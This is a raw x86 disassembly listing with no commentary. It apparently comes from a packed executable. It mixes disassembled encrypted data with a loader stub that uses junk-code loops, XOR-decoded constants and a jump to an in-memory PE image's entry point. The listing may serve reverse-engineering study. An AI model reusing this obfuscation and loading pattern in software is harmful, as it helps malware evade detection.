  40d6be:	dec    esi
  40d6bf:	adc    eax,0x6c67bb3d
  40d6c4:	(bad)  
  40d6c5:	int    0x7f
  40d6c7:	jle    0x40d684
  40d6c9:	out    dx,al
  40d6ca:	mov    ds:0x7185dd18,eax
  40d6cf:	int3   
  40d6d0:	adc    BYTE PTR [ecx-0xb003537],al
  40d6d6:	ds ins DWORD PTR es:[edi],dx
  40d6d8:	sbb    cl,ch
  40d6da:	mov    esp,0xc17a51b0
  40d6df:	dec    ecx
  40d6e0:	jnp    0x40d66f
  40d6e2:	jns    0x40d713
  40d6e4:	jge    0x40d72b
  40d6e6:	mov    cl,bl
  40d6e8:	jle    0x40d708
  40d6ea:	rol    ecx,cl
  40d6ec:	or     ch,BYTE PTR [ebp*2-0x1ab09ae7]
  40d6f3:	or     al,0x51
  40d6f5:	inc    edi
  40d6f6:	lods   eax,DWORD PTR ds:[esi]
  40d6f7:	and    esi,ebx
  40d6f9:	xor    edi,0x71b65152
  40d6ff:	and    DWORD PTR [edi+ebp*8+0x31],eax
  40d703:	jne    0x40d6c2
  40d705:	and    BYTE PTR [eax+0x35162457],ah
  40d70b:	adc    DWORD PTR [ebx-0x6a4290eb],0x1d
  40d712:	mov    edi,DWORD PTR [edi+edx*8+0x4a]
  40d716:	in     eax,0xd7
  40d718:	popf   
  40d719:	test   eax,0x4934b2c7
  40d71e:	loop   0x40d751
  40d720:	arpl   WORD PTR [esi],bp
  40d722:	mov    ecx,0xa8e5bdac
  40d727:	xchg   edx,eax
  40d728:	jl     0x40d773
  40d72a:	or     eax,0xea7619af
  40d72f:	jmp    0x40d6c6
  40d731:	(bad)  
  40d732:	cmp    DWORD PTR [ebx-0x4af6e173],ebx
  40d738:	ds sub dl,dh
  40d73b:	push   ecx
  40d73c:	pop    ebx
  40d73d:	fst    st(4)
  40d73f:	mov    ah,0xf7
  40d741:	inc    edi
  40d742:	mov    esp,0x2cdf2b5a
  40d747:	push   edx
  40d748:	xor    eax,0xbb8edb7a
  40d74d:	jae    0x40d71b
  40d74f:	jle    0x40d730
  40d751:	inc    ebx
  40d752:	mov    eax,0xdbf84d8a
  40d757:	loopne 0x40d790
  40d759:	loope  0x40d7d5
  40d75b:	ss int 0xcf
  40d75e:	(bad)  [edi-0x12]
  40d761:	mov    cl,0x5a
  40d763:	out    dx,eax
  40d764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d765:	retf   
  40d766:	repnz push ds
  40d768:	mov    esp,0xdcd08bb5
  40d76d:	dec    edi
  40d76e:	test   eax,0xfeaeefa8
  40d773:	es in  eax,0x5d
  40d776:	iret   
  40d777:	pushf  
  40d778:	xor    DWORD PTR es:[ebx-0x6065eeb5],ebp
  40d77f:	jne    0x40d7ca
  40d781:	mov    ch,0xea
  40d783:	adc    BYTE PTR [ecx+0x26e89de6],ch
  40d789:	cmp    edi,DWORD PTR [ebx-0x4a]
  40d78c:	and    eax,0x65bf7e2
  40d791:	icebp  
  40d792:	cwde   
  40d793:	repnz and eax,0x9af33ee2
  40d799:	outs   dx,BYTE PTR ds:[esi]
  40d79a:	aad    0xe5
  40d79c:	shl    al,cl
  40d79e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7a0:	sub    BYTE PTR [esi],bh
  40d7a2:	xchg   edx,eax
  40d7a3:	rcr    edi,cl
  40d7a5:	sbb    cl,BYTE PTR [esi-0x50]
  40d7a8:	es pop ss
  40d7aa:	inc    esi
  40d7ab:	mov    al,ds:0x1e44b2fb
  40d7b0:	lods   al,BYTE PTR ds:[esi]
  40d7b1:	loop   0x40d737
  40d7b3:	xchg   BYTE PTR [eax],ch
  40d7b5:	sub    DWORD PTR [ebp-0x1d],eax
  40d7b8:	mov    ebx,0xc60e2e2e
  40d7bd:	xlat   BYTE PTR ds:[ebx]
  40d7be:	xchg   ebp,eax
  40d7bf:	(bad)  [ecx+0x55bb8fb7]
  40d7c5:	jnp    0x40d7b5
  40d7c7:	xor    esp,ebp
  40d7c9:	in     al,0x23
  40d7cb:	mov    ebx,0x2ff886bf
  40d7d0:	in     al,dx
  40d7d1:	mov    cl,0x8d
  40d7d3:	clc    
  40d7d4:	cmp    bh,BYTE PTR [ecx]
  40d7d6:	adc    DWORD PTR [edi],ecx
  40d7d8:	scas   eax,DWORD PTR es:[edi]
  40d7d9:	sub    al,0x9e
  40d7db:	rcl    BYTE PTR [eax],cl
  40d7dd:	call   0xaab2:0xed034f1
  40d7e4:	inc    edx
  40d7e5:	push   edx
  40d7e6:	(bad)  
  40d7e7:	push   DWORD PTR [ebp+0x21]
  40d7ea:	dec    ebp
  40d7eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ec:	sub    al,0x36
  40d7ee:	loop   0x40d86f
  40d7f0:	ss pop esp
  40d7f2:	mov    eax,0x7fde457b
  40d7f7:	jl     0x40d7c4
  40d7f9:	ds push cs
  40d7fb:	or     ecx,edi
  40d7fd:	loopne 0x40d861
  40d7ff:	pop    edx
  40d800:	mov    ch,0x66
  40d802:	adc    cl,ah
  40d804:	and    al,0x6a
  40d806:	pusha  
  40d807:	out    dx,al
  40d808:	mov    edx,DWORD PTR [esi-0x70]
  40d80b:	call   0x272c:0x3d0d7cb6
  40d812:	mov    ecx,0xfe0c2855
  40d817:	xor    esp,DWORD PTR [ebp-0x73]
  40d81a:	sbb    dl,dh
  40d81c:	test   BYTE PTR [eax],0xeb
  40d81f:	(bad)  
  40d820:	cmp    al,0xac
  40d822:	pop    edi
  40d823:	popf   
  40d824:	xchg   BYTE PTR [ebx+0x454d4198],dh
  40d82a:	mov    ah,0x5f
  40d82c:	xchg   edx,eax
  40d82d:	jmp    0x40d8ae
  40d82f:	das    
  40d830:	test   al,0x22
  40d832:	enter  0xd22e,0x65
  40d836:	mov    eax,ss:0xcb4c26de
  40d83c:	test   al,0xa7
  40d83e:	mov    DWORD PTR [ecx+edx*8-0x6f4ce3eb],edx
  40d845:	cs xchg edx,eax
  40d847:	fcom   DWORD PTR [eax+0x6226ce1a]
  40d84d:	dec    BYTE PTR [esi+0x6c954cd7]
  40d853:	scas   eax,DWORD PTR es:[edi]
  40d854:	loope  0x40d8cd
  40d856:	or     DWORD PTR [edx-0x17a165f9],edx
  40d85c:	jo     0x40d89d
  40d85e:	ror    DWORD PTR [eax],cl
  40d860:	and    eax,0x9eb9fde0
  40d865:	push   esi
  40d866:	je     0x40d841
  40d868:	hlt    
  40d869:	sbb    DWORD PTR [edi*4+0x277be4],esi
  40d870:	adc    al,0xfd
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fde9,0x42e21c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fe76,0x42fdf1
  40d8af:	call   DWORD PTR ds:0x42e597
  40d8b5:	and    DWORD PTR ds:0x42fdfd,0x42fe82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e234,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e224,0x42fde9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e60f
  40d8ee:	sbb    DWORD PTR ds:0x42e7fb,0x42fe72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fdf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e557
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fe05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fe76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e224,0x42e7f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fe6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fded,0x42e218
  40d977:	call   DWORD PTR ds:0x42e59f
  40d97d:	mov    DWORD PTR ds:0x42e21c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e48f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fe01,0x42e234
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fded,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e3fb
  40d9be:	mov    DWORD PTR ds:0x42fe8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e218,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fdf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fdf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fdf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fdf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e28d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e64f
  40da20:	cmp    DWORD PTR ds:0x42fdf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fdf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fdf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fdf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e803,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e7f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fdd1,0x42e21c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fe05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fe05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fe05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e653
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fe05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fe05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e807,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e807,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e807,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e563
  40dae4:	cmp    DWORD PTR ds:0x42e807,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e807
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e807,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e807
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e807,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e7ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e7ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e7ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e657
  40db41:	cmp    DWORD PTR ds:0x42e7ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e7ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e7ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e7ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e7ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fe76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fe76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fe76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e65b
  40db97:	cmp    DWORD PTR ds:0x42fe76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fe76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fe76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fe76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fe76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e807,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e813,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fe7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fde5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fde5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fde5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fde5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fde5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e567
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e228,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fe01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fe09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e7f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e7f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e7f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e56b
  40dcaa:	cmp    DWORD PTR ds:0x42e7f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e7f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e7f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e7f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e7f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe82,0x42e22c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe82,0x42e224
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fdd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e218,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fe72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fe72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fe72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fe72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fe72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e56f
  40dd4f:	cmp    DWORD PTR ds:0x42fe72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fe72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fe72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fe0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e230,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fe09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe86,0x42fdfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e7f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e7ff,0x42fe8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e7eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fde5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fde5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fde5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fde5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fe09
  40de0d:	push   0x42e36d
  40de12:	call   DWORD PTR ds:0x42e573
  40de18:	cmp    DWORD PTR ds:0x42fde5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fe21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fdfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fdf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fdf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fdf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e65f
  40de65:	mov    edx,DWORD PTR ds:0x42fdf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fdf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fde9,0x42fdd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fde9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x2d002fbc]
